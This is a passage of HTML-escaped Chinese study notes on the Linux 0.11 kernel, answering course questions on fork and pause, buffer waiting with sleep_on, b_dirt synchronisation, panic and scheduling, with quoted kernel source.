$0x80&amp;quot;&lt;/span&gt; \\ &lt;span class=&#34;comment&#34;&gt;//int 0x80到哪呀, syscall 在sched_init那里,执行完,特权变0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	: &lt;span class=&#34;string&#34;&gt;&amp;quot;=a&amp;quot;&lt;/span&gt; (__res) \\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	: &lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; (__NR_#&lt;span class=&#34;meta&#34;&gt;#name)); \\ &lt;span class=&#34;comment&#34;&gt;//把name 贴过来&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__res &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) \\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (type) __res; \\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;errno = -__res; \\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;; \\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		调用完了fork回到main,fork的返回值是1,所以!fork()是0,不进入到里面执行,进入到下面的pause&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (! fork()) &amp;#123;		&lt;span class=&#34;comment&#34;&gt;/* we count on this going ok */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		init(); &lt;span class=&#34;comment&#34;&gt;//进程1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(;;) pause(); &lt;span class=&#34;comment&#34;&gt;//这一行是进程0的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;







&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;kernel/sched.h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sys_pause&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	current-&amp;gt;state = TASK_INTERRUPTIBLE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	schedule();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		进入schedule调度函数&lt;/p&gt;
&lt;h1 id=&#34;25、打开保护模式、分页后，线性地址到物理地址是如何转换的？&#34;&gt;&lt;a href=&#34;#25、打开保护模式、分页后，线性地址到物理地址是如何转换的？&#34; class=&#34;headerlink&#34; title=&#34;25、打开保护模式、分页后，线性地址到物理地址是如何转换的？&#34;&gt;&lt;/a&gt;25、打开保护模式、分页后，线性地址到物理地址是如何转换的？&lt;/h1&gt;&lt;h1 id=&#34;26、getblk函数中，申请空闲缓冲块的标准就是b-count为0，而申请到之后，为什么在wait-on-buffer-bh-后又执行if（bh-gt-b-count）来判断b-count是否为0？&#34;&gt;&lt;a href=&#34;#26、getblk函数中，申请空闲缓冲块的标准就是b-count为0，而申请到之后，为什么在wait-on-buffer-bh-后又执行if（bh-gt-b-count）来判断b-count是否为0？&#34; class=&#34;headerlink&#34; title=&#34;26、getblk函数中，申请空闲缓冲块的标准就是b_count为0，而申请到之后，为什么在wait_on_buffer(bh)后又执行if（bh-&amp;gt;b_count）来判断b_count是否为0？&#34;&gt;&lt;/a&gt;26、getblk函数中，申请空闲缓冲块的标准就是b_count为0，而申请到之后，为什么在wait_on_buffer(bh)后又执行if（bh-&amp;gt;b_count）来判断b_count是否为0？&lt;/h1&gt;&lt;p&gt;p114&lt;/p&gt;
&lt;p&gt;​		这个要看wait_on_buffer函数的功能了,它里面有sleep_on函数,而sleep_on函数里面包含了schedule函数,虽然现在的缓冲块是合适的,但是有可能在睡眠阶段的时候被别的任务占用,所以在使用之前需要判断是否被修改了,修改的话就需要等待解锁&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;fs/buffer.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;wait_on_buffer&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; buffer_head * bh)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cli();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (bh-&amp;gt;b_lock)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		sleep_on(&amp;amp;bh-&amp;gt;b_wait); &lt;span class=&#34;comment&#34;&gt;//bh在哪? bh全局的,buf init那里&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//不要傻等,切进程, 有主动轮询变为被动响应&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sti();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kernel/sched.h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sleep_on&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; task_struct **p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;task_struct&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;tmp&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 有的是请求项 有的是缓冲块等待队列&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (current == &amp;amp;(init_task.task))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		panic(&lt;span class=&#34;string&#34;&gt;&amp;quot;task[0] trying to sleep&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	tmp = *p; &lt;span class=&#34;comment&#34;&gt;// bh-&amp;gt;b_wait&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	*p = current;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	current-&amp;gt;state = TASK_UNINTERRUPTIBLE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	schedule();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (tmp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		tmp-&amp;gt;state=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;27、b-dirt已经被置为1的缓冲块，同步前能够被进程继续读、写？给出代码证据。&#34;&gt;&lt;a href=&#34;#27、b-dirt已经被置为1的缓冲块，同步前能够被进程继续读、写？给出代码证据。&#34; class=&#34;headerlink&#34; title=&#34;27、b_dirt已经被置为1的缓冲块，同步前能够被进程继续读、写？给出代码证据。&#34;&gt;&lt;/a&gt;27、b_dirt已经被置为1的缓冲块，同步前能够被进程继续读、写？给出代码证据。&lt;/h1&gt;&lt;p&gt;p331&lt;/p&gt;
&lt;p&gt;​		要回答这个问题先得了解下b_uptodate,b_uptodate设置为1的时候(P326),标志着缓冲块中的数据是基于硬盘数据块的,内核可以放心地支持进程与缓冲块进行数据交互.&lt;/p&gt;
&lt;p&gt;​		此时,读操作不会改写缓冲块的数据,所以不会影响硬盘数据块的内容,如果写的话,就需要改变缓冲块的内容,此时,将b_dirt置为1,在同步前,当然可以继续读写了..我觉得这很显然.&lt;/p&gt;
&lt;p&gt;​		老师大概想表达的意思是,b_dirt虽然被置为1了,但是在此之前,硬盘-&amp;gt;缓冲块这一路径已经同步过了,没有改写的部分是同步的,改写的那肯定就是改写的,所以不影响我们继续读写,&lt;font color=&#34;red&#34;&gt; b_uptodate仍然设置为1,它为1就标志着我们仍然可以读写&lt;/font&gt;&lt;/p&gt;
&lt;h2 id=&#34;代码证据&#34;&gt;&lt;a href=&#34;#代码证据&#34; class=&#34;headerlink&#34; title=&#34;代码证据&#34;&gt;&lt;/a&gt;代码证据&lt;/h2&gt;&lt;p&gt;​		想要的证据是说读写都不需要检查b_dirt位嘛?或者说改变了b_dirt不会改变b_uptodate?&lt;/p&gt;
&lt;p&gt;&lt;em&gt;P331&lt;/em&gt;的&lt;em&gt;file_write&lt;/em&gt; &lt;/p&gt;
&lt;p&gt;&lt;em&gt;P314&lt;/em&gt;的 &lt;em&gt;file_read&lt;/em&gt; &lt;/p&gt;
&lt;p&gt;&lt;em&gt;P330&lt;/em&gt;的 &lt;em&gt;bread getblk&lt;/em&gt; &lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;28、分析panic函数的源代码，根据你学过的操作系统知识，完整、准确的判断panic函数所起的作用。假如操作系统设计为支持内核进程（始终运行在0特权级的进程），你将如何改进panic函数？&#34;&gt;&lt;a href=&#34;#28、分析panic函数的源代码，根据你学过的操作系统知识，完整、准确的判断panic函数所起的作用。假如操作系统设计为支持内核进程（始终运行在0特权级的进程），你将如何改进panic函数？&#34; class=&#34;headerlink&#34; title=&#34;28、分析panic函数的源代码，根据你学过的操作系统知识，完整、准确的判断panic函数所起的作用。假如操作系统设计为支持内核进程（始终运行在0特权级的进程），你将如何改进panic函数？&#34;&gt;&lt;/a&gt;28、分析panic函数的源代码，根据你学过的操作系统知识，完整、准确的判断panic函数所起的作用。假如操作系统设计为支持内核进程（始终运行在0特权级的进程），你将如何改进panic函数？&lt;/h1&gt;&lt;p&gt;赵炯p175&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;p&gt;kernel&amp;#x2F;panic.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *  linux/kernel/panic.c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *  (C) 1991  Linus Torvalds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * This function is used through-out the kernel (includeinh mm and fs)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * to indicate a major problem.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;linux/kernel.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;linux/sched.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sys_sync&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;;	&lt;span class=&#34;comment&#34;&gt;/* it&amp;#x27;s really int */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;volatile&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;panic&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; * s)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	printk(&lt;span class=&#34;string&#34;&gt;&amp;quot;Kernel panic: %s\n\r&amp;quot;&lt;/span&gt;,s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (current == task[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		printk(&lt;span class=&#34;string&#34;&gt;&amp;quot;In swapper task - not syncing\n\r&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		sys_sync();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(;;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;sys_sync 在 fs&amp;#x2F;buffer.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sys_sync&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;buffer_head&lt;/span&gt; * &lt;span class=&#34;title&#34;&gt;bh&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sync_inodes();		&lt;span class=&#34;comment&#34;&gt;/* write out inodes into buffers */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	bh = start_buffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; ; i&amp;lt;NR_BUFFERS ; i++,bh++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		wait_on_buffer(bh);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (bh-&amp;gt;b_dirt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			ll_rw_block(WRITE,bh);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;29、详细分析进程调度的全过程。考虑所有可能（signal、alarm除外）&#34;&gt;&lt;a href=&#34;#29、详细分析进程调度的全过程。考虑所有可能（signal、alarm除外）&#34; class=&#34;headerlink&#34; title=&#34;29、详细分析进程调度的全过程。考虑所有可能（signal、alarm除外）&#34;&gt;&lt;/a&gt;29、详细分析进程调度的全过程。考虑所有可能（signal、alarm除外）&lt;/h1&gt;&lt;p&gt;p103 p125&lt;/p&gt;
&lt;h1 id=&#34;30、wait-on-buffer函数中为什么不用if（）而是用while（）？&#34;&gt;&lt;a href=&#34;#30、wait-on-buffer函数中为什么不用if（）而是用while（）？&#34; class=&#34;headerlink&#34; title=&#34;30、wait_on_buffer函数中为什么不用if（）而是用while（）？&#34;&gt;&lt;/a&gt;30、wait_on_buffer函数中为什么不用if（）而是用while（）？&lt;/h1&gt;&lt;p&gt;​		因为它可能会执行很多次呀,要进行轮询,if只能判断一次,那为啥可能会执行很多次呢? 因为操作系统是很复杂,存在很多种可能,其中一种就是:&lt;/p&gt;
&lt;p&gt;​		很多歌进程都在等待同一个缓冲块,在缓冲块同步完毕的时候,唤醒各个等待进程到轮转到某一个进程的过程中,很有可能此时的缓冲块又被其他进程占用了,并且被加上了锁. 如果用if的话,只判断一次,就会出现错误,while的话则会重新判断.&lt;/p&gt;
